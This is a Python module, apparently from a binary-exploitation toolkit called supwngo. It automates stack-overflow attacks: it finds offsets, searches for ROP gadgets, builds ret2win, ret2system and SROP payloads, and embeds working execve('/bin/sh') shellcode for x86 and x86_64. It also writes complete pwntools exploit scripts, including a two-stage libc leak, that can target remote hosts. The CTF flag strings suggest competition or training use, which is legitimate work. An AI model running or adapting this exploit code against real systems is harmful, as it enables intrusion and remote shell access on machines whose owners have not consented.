"""
AutoExploit Module - Automated Binary Exploitation.

Attempts automatic exploitation of common vulnerability types:
- Stack buffer overflow with ret2win
- Stack buffer overflow with shellcode (NX disabled)
- Stack buffer overflow with ret2libc/ret2system
- SROP for static binaries
- Simple format string attacks

Uses pwntools for interaction and payload generation.
"""

import subprocess
import tempfile
import os
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import TYPE_CHECKING, Callable, Dict, List, Optional, Tuple, Any

if TYPE_CHECKING:
    from supwngo.core.binary import Binary

from supwngo.utils.logging import get_logger
from supwngo.exploit.offset_finder import cyclic, cyclic_find

logger = get_logger(__name__)


class ExploitResult(Enum):
    """Result of exploitation attempt."""
    SUCCESS = auto()
    PARTIAL = auto()  # Got crash/control but no shell
    FAILED = auto()
    TIMEOUT = auto()
    ERROR = auto()


@dataclass
class ExploitAttempt:
    """Record of an exploitation attempt."""
    technique: str
    result: ExploitResult
    payload: bytes = b""
    offset: int = 0
    target_addr: int = 0
    notes: List[str] = field(default_factory=list)
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "technique": self.technique,
            "result": self.result.name,
            "offset": self.offset,
            "target_addr": hex(self.target_addr) if self.target_addr else None,
            "payload_len": len(self.payload),
            "notes": self.notes,
            "error": self.error,
        }


@dataclass
class AutoExploitReport:
    """Report from auto-exploitation attempt."""
    binary_path: str
    successful: bool = False
    technique_used: str = ""
    attempts: List[ExploitAttempt] = field(default_factory=list)
    final_payload: bytes = b""
    exploit_script: str = ""
    notes: List[str] = field(default_factory=list)

    def summary(self) -> str:
        lines = [
            f"AutoExploit Report: {self.binary_path}",
            f"Result: {'SUCCESS' if self.successful else 'FAILED'}",
        ]
        if self.successful:
            lines.append(f"Technique: {self.technique_used}")
            lines.append(f"Payload length: {len(self.final_payload)}")
        lines.append(f"\nAttempts: {len(self.attempts)}")
        for attempt in self.attempts:
            status = "OK" if attempt.result == ExploitResult.SUCCESS else attempt.result.name
            lines.append(f"  - {attempt.technique}: {status}")
        return "\n".join(lines)


class AutoExploiter:
    """
    Automated binary exploitation engine.

    Attempts various exploitation techniques automatically based on
    binary characteristics and detected vulnerabilities.

    Usage:
        exploiter = AutoExploiter(binary)
        report = exploiter.run()

        if report.successful:
            print(f"Exploit succeeded with {report.technique_used}")
            print(report.exploit_script)
    """

    # Common win function names
    WIN_FUNCTIONS = [
        "win", "flag", "shell", "get_flag", "print_flag", "read_flag",
        "give_shell", "spawn_shell", "backdoor", "secret", "winner",
        "cat_flag", "system_shell", "ez_win", "vuln_func", "getshell",
    ]

    def __init__(
        self,
        binary: "Binary",
        timeout: float = 5.0,
        max_offset: int = 2048,
        input_method: str = "stdin",  # stdin, argv, both
        libc_path: Optional[str] = None,
    ):
        """
        Initialize auto-exploiter.

        Args:
            binary: Target binary
            timeout: Timeout for each attempt in seconds
            max_offset: Maximum buffer offset to try
            input_method: How to send input (stdin, argv, both)
            libc_path: Path to custom libc file for ret2libc
        """
        self.binary = binary
        self.timeout = timeout
        self.max_offset = max_offset
        self.input_method = input_method
        self.libc_path = libc_path
        self.report = AutoExploitReport(binary_path=str(binary.path))

        # Analysis results
        self._offset: Optional[int] = None
        self._win_func: Optional[Tuple[str, int]] = None
        self._binsh_addr: Optional[int] = None
        self._gadgets: Dict[str, int] = {}
        self._libc: Optional[Any] = None  # Loaded libc ELF

        # Load libc if provided
        if libc_path:
            try:
                from pwn import ELF
                self._libc = ELF(libc_path)
                logger.info(f"Loaded custom libc: {libc_path}")
            except Exception as e:
                logger.warning(f"Failed to load libc: {e}")

    def run(self, techniques: List[str] = None) -> AutoExploitReport:
        """
        Run automatic exploitation.

        Args:
            techniques: List of techniques to try, or None for all

        Returns:
            AutoExploitReport with results
        """
        # Default technique order based on simplicity
        if techniques is None:
            techniques = [
                "ret2win",
                "shellcode",
                "ret2system",
                "srop",
            ]

        # Pre-analysis
        self._analyze_binary()

        # Try each technique
        for technique in techniques:
            if self.report.successful:
                break

            try:
                if technique == "ret2win":
                    self._try_ret2win()
                elif technique == "shellcode":
                    self._try_shellcode()
                elif technique == "ret2system":
                    self._try_ret2system()
                elif technique == "srop":
                    self._try_srop()
                else:
                    logger.warning(f"Unknown technique: {technique}")
            except Exception as e:
                logger.error(f"Error in {technique}: {e}")
                self.report.attempts.append(ExploitAttempt(
                    technique=technique,
                    result=ExploitResult.ERROR,
                    error=str(e),
                ))

        return self.report

    def _analyze_binary(self):
        """Pre-analyze binary for exploitation."""
        # Find win function
        for name in self.WIN_FUNCTIONS:
            if name in self.binary.symbols:
                sym = self.binary.symbols[name]
                addr = sym.address if hasattr(sym, 'address') else sym
                self._win_func = (name, addr)
                logger.info(f"Found win function: {name} @ 0x{addr:x}")
                break

        # Find /bin/sh
        self._binsh_addr = self._search_string("/bin/sh")
        if self._binsh_addr:
            logger.info(f"Found /bin/sh @ 0x{self._binsh_addr:x}")

        # Find key gadgets
        self._find_gadgets()

        # Try to find offset automatically
        self._offset = self._find_offset()
        if self._offset:
            logger.info(f"Found buffer offset: {self._offset}")

    def _search_string(self, s: str) -> Optional[int]:
        """Search for string in binary."""
        try:
            if hasattr(self.binary, '_elf') and self.binary._elf:
                results = list(self.binary._elf.search(s.encode()))
                if results:
                    return results[0]
        except Exception:
            pass

        # Fallback to raw search
        try:
            data = self.binary.path.read_bytes()
            idx = data.find(s.encode())
            if idx >= 0:
                for section in self.binary.sections.values():
                    if section.offset <= idx < section.offset + section.size:
                        return section.address + (idx - section.offset)
        except Exception:
            pass
        return None

    def _find_gadgets(self):
        """Find useful ROP gadgets."""
        try:
            from supwngo.exploit.rop.gadgets import GadgetFinder
            finder = GadgetFinder(self.binary)
            finder.find_gadgets()

            # Get key gadgets
            ret = finder.find_ret()
            if ret:
                self._gadgets['ret'] = ret.address

            pop_rdi = finder.find_pop_reg('rdi')
            if pop_rdi:
                self._gadgets['pop_rdi'] = pop_rdi.address

            syscall = finder.find_syscall()
            if syscall:
                self._gadgets['syscall'] = syscall.address

            pop_rax = finder.find_pop_reg('rax')
            if pop_rax:
                self._gadgets['pop_rax'] = pop_rax.address

        except Exception as e:
            logger.debug(f"Gadget finding failed: {e}")

    def _find_offset(self) -> Optional[int]:
        """Find buffer overflow offset using cyclic pattern."""
        # Generate pattern
        pattern = cyclic(self.max_offset)

        # Try to crash the binary and get crash address
        try:
            result = subprocess.run(
                [str(self.binary.path)],
                input=pattern,
                capture_output=True,
                timeout=self.timeout,
            )

            # Check for crash
            if result.returncode < 0:
                # Try to find crash address in error output
                # This is platform-dependent
                pass

        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            logger.debug(f"Offset finding failed: {e}")

        # Try with GDB if available
        return self._find_offset_gdb(pattern)

    def _find_offset_gdb(self, pattern: bytes) -> Optional[int]:
        """Find offset using GDB."""
        gdb_script = f"""
set pagination off
set confirm off
run < /dev/stdin
info registers rsp rip
quit
"""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.gdb', delete=False) as f:
                f.write(gdb_script)
                gdb_script_path = f.name

            result = subprocess.run(
                ['gdb', '-batch', '-x', gdb_script_path, str(self.binary.path)],
                input=pattern,
                capture_output=True,
                timeout=self.timeout * 2,
            )

            output = result.stdout.decode('latin-1', errors='ignore')

            # Parse RIP/RSP from output
            import re
            rip_match = re.search(r'rip\s+0x([0-9a-fA-F]+)', output)
            if rip_match:
                crash_addr = int(rip_match.group(1), 16)
                # Check if crash address is in our pattern
                offset = cyclic_find(crash_addr)
                if offset >= 0:
                    return offset

        except Exception as e:
            logger.debug(f"GDB offset finding failed: {e}")
        finally:
            try:
                os.unlink(gdb_script_path)
            except:
                pass

        return None

    def _try_ret2win(self):
        """Try ret2win exploitation."""
        attempt = ExploitAttempt(technique="ret2win", result=ExploitResult.FAILED)

        if not self._win_func:
            attempt.notes.append("No win function found")
            self.report.attempts.append(attempt)
            return

        win_name, win_addr = self._win_func
        attempt.target_addr = win_addr

        # Need offset
        if not self._offset:
            # Try common offsets
            for test_offset in [40, 64, 72, 88, 104, 120, 136, 152, 168]:
                if self._test_ret2win(test_offset, win_addr):
                    self._offset = test_offset
                    break

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset

        # Build payload
        payload = b"A" * self._offset

        # Add ret gadget for alignment on 64-bit
        if self.binary.bits == 64 and 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])

        payload += self._p64(win_addr) if self.binary.bits == 64 else self._p32(win_addr)

        attempt.payload = payload

        # Test exploit
        if self._test_exploit(payload):
            attempt.result = ExploitResult.SUCCESS
            self.report.successful = True
            self.report.technique_used = "ret2win"
            self.report.final_payload = payload
            self.report.exploit_script = self._generate_ret2win_script(
                self._offset, win_addr, win_name
            )

        self.report.attempts.append(attempt)

    def _test_ret2win(self, offset: int, win_addr: int) -> bool:
        """Test if ret2win works with given offset."""
        payload = b"A" * offset
        if self.binary.bits == 64 and 'ret' in self._gadgets:
            payload += self._p64(self._gadgets['ret'])
        payload += self._p64(win_addr) if self.binary.bits == 64 else self._p32(win_addr)
        return self._test_exploit(payload)

    def _try_shellcode(self):
        """Try shellcode injection (NX disabled)."""
        attempt = ExploitAttempt(technique="shellcode", result=ExploitResult.FAILED)

        # Check if NX is disabled
        if self.binary.protections.nx:
            attempt.notes.append("NX is enabled, shellcode not viable")
            self.report.attempts.append(attempt)
            return

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset

        # Generate shellcode
        shellcode = self._get_shellcode()

        # This is tricky - need to know buffer address
        # For now, just record that shellcode is possible
        attempt.notes.append("Shellcode injection possible but needs buffer address")
        attempt.result = ExploitResult.PARTIAL

        # Generate template script
        self.report.exploit_script = self._generate_shellcode_script(self._offset, shellcode)

        self.report.attempts.append(attempt)

    def _try_ret2system(self):
        """Try ret2libc/ret2system exploitation."""
        attempt = ExploitAttempt(technique="ret2system", result=ExploitResult.FAILED)

        # Check if dynamically linked
        is_static = getattr(self.binary.protections, 'static', False)
        if is_static:
            attempt.notes.append("Static binary, ret2system not applicable")
            self.report.attempts.append(attempt)
            return

        # Check for system in PLT
        system_plt = self.binary.plt.get('system')
        if not system_plt:
            attempt.notes.append("system not in PLT, need libc leak")
            # Generate leak-and-exploit template
            self.report.exploit_script = self._generate_leak_exploit_script()
            attempt.result = ExploitResult.PARTIAL
            self.report.attempts.append(attempt)
            return

        attempt.target_addr = system_plt

        # Need pop rdi gadget for 64-bit
        if self.binary.bits == 64 and 'pop_rdi' not in self._gadgets:
            attempt.notes.append("Missing pop rdi gadget")
            self.report.attempts.append(attempt)
            return

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset

        # Build payload
        # Need /bin/sh string - check if in binary
        binsh = self._binsh_addr
        if not binsh:
            attempt.notes.append("/bin/sh not in binary, need to write or use libc")
            self.report.attempts.append(attempt)
            return

        payload = b"A" * self._offset

        if self.binary.bits == 64:
            # ret for alignment
            if 'ret' in self._gadgets:
                payload += self._p64(self._gadgets['ret'])
            # pop rdi; ret
            payload += self._p64(self._gadgets['pop_rdi'])
            payload += self._p64(binsh)
            # system
            payload += self._p64(system_plt)
        else:
            # 32-bit: system + fake_ret + /bin/sh
            payload += self._p32(system_plt)
            payload += self._p32(0xdeadbeef)  # fake return
            payload += self._p32(binsh)

        attempt.payload = payload

        # Test
        if self._test_exploit(payload, expect_shell=True):
            attempt.result = ExploitResult.SUCCESS
            self.report.successful = True
            self.report.technique_used = "ret2system"
            self.report.final_payload = payload

        self.report.exploit_script = self._generate_ret2system_script(
            self._offset, system_plt, binsh
        )

        self.report.attempts.append(attempt)

    def _try_srop(self):
        """Try SROP exploitation."""
        attempt = ExploitAttempt(technique="srop", result=ExploitResult.FAILED)

        # Need syscall and way to set rax
        if 'syscall' not in self._gadgets:
            attempt.notes.append("No syscall gadget found")
            self.report.attempts.append(attempt)
            return

        if 'pop_rax' not in self._gadgets:
            attempt.notes.append("No pop rax gadget found")
            self.report.attempts.append(attempt)
            return

        # Need /bin/sh
        binsh = self._binsh_addr
        if not binsh:
            attempt.notes.append("/bin/sh not found in binary")
            self.report.attempts.append(attempt)
            return

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset
        attempt.target_addr = self._gadgets['syscall']

        # Generate SROP script (complex payload, better to generate script)
        self.report.exploit_script = self._generate_srop_script(
            self._offset,
            self._gadgets['syscall'],
            self._gadgets['pop_rax'],
            binsh
        )

        attempt.result = ExploitResult.PARTIAL
        attempt.notes.append("SROP payload generated, requires manual testing")

        self.report.attempts.append(attempt)

    def _test_exploit(self, payload: bytes, expect_shell: bool = False) -> bool:
        """Test if exploit payload works."""
        try:
            result = subprocess.run(
                [str(self.binary.path)],
                input=payload,
                capture_output=True,
                timeout=self.timeout,
            )

            # Check output for success indicators
            output = result.stdout + result.stderr
            output_str = output.decode('latin-1', errors='ignore').lower()

            # Success indicators
            success_indicators = [
                'flag{', 'ctf{', 'htb{', 'picoctf{',
                'congratulations', 'you win', 'success',
                '/bin/sh', '/bin/bash', '$',
            ]

            for indicator in success_indicators:
                if indicator in output_str:
                    return True

            # Check return code (0 might indicate success for win functions)
            if result.returncode == 0 and not expect_shell:
                return True

        except subprocess.TimeoutExpired:
            # Timeout might indicate we got a shell
            if expect_shell:
                return True
        except Exception as e:
            logger.debug(f"Exploit test failed: {e}")

        return False

    def _get_shellcode(self) -> bytes:
        """Get appropriate shellcode for architecture."""
        if self.binary.bits == 64:
            # execve("/bin/sh", 0, 0) for x86_64
            return (
                b"\x48\x31\xf6"              # xor rsi, rsi
                b"\x56"                      # push rsi
                b"\x48\xbf\x2f\x62\x69\x6e"  # movabs rdi, 0x68732f6e69622f
                b"\x2f\x2f\x73\x68"
                b"\x57"                      # push rdi
                b"\x54"                      # push rsp
                b"\x5f"                      # pop rdi
                b"\x48\x31\xd2"              # xor rdx, rdx
                b"\xb0\x3b"                  # mov al, 59
                b"\x0f\x05"                  # syscall
            )
        else:
            # execve("/bin/sh", 0, 0) for x86
            return (
                b"\x31\xc0"                  # xor eax, eax
                b"\x50"                      # push eax
                b"\x68\x2f\x2f\x73\x68"      # push "//sh"
                b"\x68\x2f\x62\x69\x6e"      # push "/bin"
                b"\x89\xe3"                  # mov ebx, esp
                b"\x50"                      # push eax
                b"\x53"                      # push ebx
                b"\x89\xe1"                  # mov ecx, esp
                b"\x31\xd2"                  # xor edx, edx
                b"\xb0\x0b"                  # mov al, 11
                b"\xcd\x80"                  # int 0x80
            )

    def _p64(self, addr: int) -> bytes:
        """Pack 64-bit address."""
        return addr.to_bytes(8, 'little')

    def _p32(self, addr: int) -> bytes:
        """Pack 32-bit address."""
        return addr.to_bytes(4, 'little')

    # === Script Generation ===

    def _generate_ret2win_script(self, offset: int, win_addr: int, win_name: str) -> str:
        """Generate ret2win exploit script."""
        ret_gadget = self._gadgets.get('ret', 0)

        return f'''#!/usr/bin/env python3
"""
ret2win Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

Target: {win_name} @ {hex(win_addr)}
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Addresses
    win_addr = {hex(win_addr)}  # {win_name}
    ret_gadget = {hex(ret_gadget) if ret_gadget else "None  # Find a ret gadget if needed"}

    # Build payload
    offset = {offset}
    payload = b"A" * offset

    # Stack alignment (64-bit needs 16-byte alignment before call)
    {"payload += p64(ret_gadget)  # ret for alignment" if self.binary.bits == 64 and ret_gadget else "# No alignment needed (32-bit or no ret gadget)"}

    # Return to win function
    payload += {"p64" if self.binary.bits == 64 else "p32"}(win_addr)

    log.info(f"Payload length: {{len(payload)}}")
    log.info(f"Sending payload...")

    io.sendline(payload)

    # Get output
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_shellcode_script(self, offset: int, shellcode: bytes) -> str:
        """Generate shellcode injection exploit script."""
        return f'''#!/usr/bin/env python3
"""
Shellcode Injection Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

NX is disabled - direct shellcode execution possible
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Shellcode - execve("/bin/sh", 0, 0)
    shellcode = {repr(shellcode)}

    # Offset to return address
    offset = {offset}

    # TODO: You need to find the buffer address
    # Options:
    # 1. Leak stack address
    # 2. Use jmp esp/rsp gadget
    # 3. Known fixed address (no ASLR/PIE)

    buffer_addr = 0x0  # <-- SET THIS

    # Build payload
    nop_sled = b"\\x90" * 32  # NOP sled
    payload = nop_sled + shellcode
    payload = payload.ljust(offset, b"A")
    payload += {"p64" if self.binary.bits == 64 else "p32"}(buffer_addr + len(nop_sled)//2)

    log.info(f"Shellcode length: {{len(shellcode)}}")
    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_ret2system_script(self, offset: int, system_addr: int, binsh_addr: int) -> str:
        """Generate ret2system exploit script."""
        pop_rdi = self._gadgets.get('pop_rdi', 0)
        ret = self._gadgets.get('ret', 0)

        return f'''#!/usr/bin/env python3
"""
ret2system Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

Calls system("/bin/sh") via PLT
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Addresses
    system_plt = {hex(system_addr)}
    binsh_addr = {hex(binsh_addr)}
    {"pop_rdi = " + hex(pop_rdi) if pop_rdi else "pop_rdi = 0  # TODO: Find pop rdi; ret gadget"}
    {"ret_gadget = " + hex(ret) if ret else "ret_gadget = 0  # TODO: Find ret gadget for alignment"}

    # Build payload
    offset = {offset}
    payload = b"A" * offset

    {"# 64-bit calling convention" if self.binary.bits == 64 else "# 32-bit calling convention"}
    {f'''payload += p64(ret_gadget)    # Stack alignment
    payload += p64(pop_rdi)       # pop rdi; ret
    payload += p64(binsh_addr)    # "/bin/sh"
    payload += p64(system_plt)    # system()''' if self.binary.bits == 64 else f'''payload += p32(system_plt)    # system()
    payload += p32(0xdeadbeef)    # fake return address
    payload += p32(binsh_addr)    # "/bin/sh"'''}

    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_leak_exploit_script(self) -> str:
        """Generate leak-and-exploit script template."""
        pop_rdi = self._gadgets.get('pop_rdi', 0)
        ret = self._gadgets.get('ret', 0)

        # Get some PLT/GOT entries
        puts_plt = self.binary.plt.get('puts', 0)
        puts_got = self.binary.got.get('puts', 0)
        main_addr = self.binary.symbols.get('main', 0)
        if hasattr(main_addr, 'address'):
            main_addr = main_addr.address

        return f'''#!/usr/bin/env python3
"""
Leak and Exploit Template for {self.binary.path.name}
Generated by supwngo AutoExploit

Two-stage exploit:
1. Leak libc address via GOT
2. Calculate libc base and call system("/bin/sh")
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0
LIBC = ""  # Path to libc if known

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)
    libc = ELF(LIBC) if LIBC else None

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Gadgets
    {"pop_rdi = " + hex(pop_rdi) if pop_rdi else "pop_rdi = 0  # TODO: Find pop rdi; ret"}
    {"ret_gadget = " + hex(ret) if ret else "ret_gadget = 0  # TODO: Find ret gadget"}

    # PLT/GOT
    puts_plt = {hex(puts_plt) if puts_plt else "elf.plt['puts']"}
    puts_got = {hex(puts_got) if puts_got else "elf.got['puts']"}
    main_addr = {hex(main_addr) if main_addr else "elf.symbols['main']"}

    # TODO: Set correct offset
    offset = 0  # <-- FIND THIS

    # === Stage 1: Leak libc ===
    log.info("Stage 1: Leaking libc address...")

    payload1 = b"A" * offset
    payload1 += p64(pop_rdi)
    payload1 += p64(puts_got)
    payload1 += p64(puts_plt)
    payload1 += p64(main_addr)  # Return to main for stage 2

    io.sendline(payload1)

    # Parse leaked address
    io.recvuntil(b"\\n")  # Adjust based on binary output
    leak = u64(io.recv(6).ljust(8, b"\\x00"))
    log.success(f"Leaked puts@libc: {{hex(leak)}}")

    # Calculate libc base
    if libc:
        libc.address = leak - libc.symbols['puts']
        log.success(f"Libc base: {{hex(libc.address)}}")
        system = libc.symbols['system']
        binsh = next(libc.search(b"/bin/sh\\x00"))
    else:
        # Manual offsets (find with libc-database)
        # Example for libc6_2.31-0ubuntu9_amd64:
        # puts_offset = 0x84420
        # system_offset = 0x52290
        # binsh_offset = 0x1b45bd
        log.warning("No libc provided, using placeholder offsets")
        puts_offset = 0x0
        system_offset = 0x0
        binsh_offset = 0x0
        libc_base = leak - puts_offset
        system = libc_base + system_offset
        binsh = libc_base + binsh_offset

    # === Stage 2: Call system("/bin/sh") ===
    log.info("Stage 2: Calling system('/bin/sh')...")

    payload2 = b"A" * offset
    payload2 += p64(ret_gadget)   # Stack alignment
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh)
    payload2 += p64(system)

    io.sendline(payload2)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_srop_script(self, offset: int, syscall_addr: int, pop_rax: int, binsh_addr: int) -> str:
        """Generate SROP exploit script."""
        return f'''#!/usr/bin/env python3
"""
SROP (Sigreturn-Oriented Programming) Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

Uses sigreturn to set all registers for execve syscall
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.arch = "{'amd64' if self.binary.bits == 64 else 'i386'}"
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Gadgets
    syscall_ret = {hex(syscall_addr)}
    pop_rax = {hex(pop_rax)}
    binsh_addr = {hex(binsh_addr)}

    # Build SROP frame
    frame = SigreturnFrame()
    frame.rax = 59           # execve syscall number
    frame.rdi = binsh_addr   # "/bin/sh"
    frame.rsi = 0            # argv = NULL
    frame.rdx = 0            # envp = NULL
    frame.rip = syscall_ret  # Continue to syscall

    # Build payload
    offset = {offset}
    payload = b"A" * offset
    payload += p64(pop_rax)
    payload += p64(15)           # SYS_rt_sigreturn
    payload += p64(syscall_ret)  # Trigger sigreturn
    payload += bytes(frame)

    log.info(f"Payload length: {{len(payload)}}")
    log.info(f"SROP frame size: {{len(bytes(frame))}}")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''


# Convenience functions

def auto_exploit(binary: "Binary", **kwargs) -> AutoExploitReport:
    """
    Attempt automatic exploitation of binary.

    Args:
        binary: Target binary
        **kwargs: Options passed to AutoExploiter

    Returns:
        AutoExploitReport with results
    """
    exploiter = AutoExploiter(binary, **kwargs)
    return exploiter.run()


def generate_exploit_script(
    binary: "Binary",
    technique: str = None,
    offset: int = None,
    libc_path: str = None,
) -> str:
    """
    Generate exploit script for binary.

    Args:
        binary: Target binary
        technique: Specific technique (ret2win, shellcode, ret2system, srop)
        offset: Known buffer offset
        libc_path: Path to custom libc file

    Returns:
        Python exploit script as string
    """
    exploiter = AutoExploiter(binary, libc_path=libc_path)
    exploiter._analyze_binary()

    if offset:
        exploiter._offset = offset

    # Auto-detect best technique if not specified
    if technique is None:
        if exploiter._win_func:
            technique = "ret2win"
        elif not binary.protections.nx:
            technique = "shellcode"
        elif not getattr(binary.protections, 'static', False):
            technique = "ret2system"
        else:
            technique = "srop"

    # Generate appropriate script
    if technique == "ret2win" and exploiter._win_func:
        name, addr = exploiter._win_func
        return exploiter._generate_ret2win_script(
            exploiter._offset or 0, addr, name
        )
    elif technique == "shellcode":
        return exploiter._generate_shellcode_script(
            exploiter._offset or 0, exploiter._get_shellcode()
        )
    elif technique == "ret2system":
        system_plt = binary.plt.get('system', 0)
        binsh = exploiter._binsh_addr or 0
        if system_plt:
            return exploiter._generate_ret2system_script(
                exploiter._offset or 0, system_plt, binsh
            )
        else:
            return exploiter._generate_leak_exploit_script()
    elif technique == "srop":
        return exploiter._generate_srop_script(
            exploiter._offset or 0,
            exploiter._gadgets.get('syscall', 0),
            exploiter._gadgets.get('pop_rax', 0),
            exploiter._binsh_addr or 0
        )
    else:
        return exploiter._generate_leak_exploit_script()
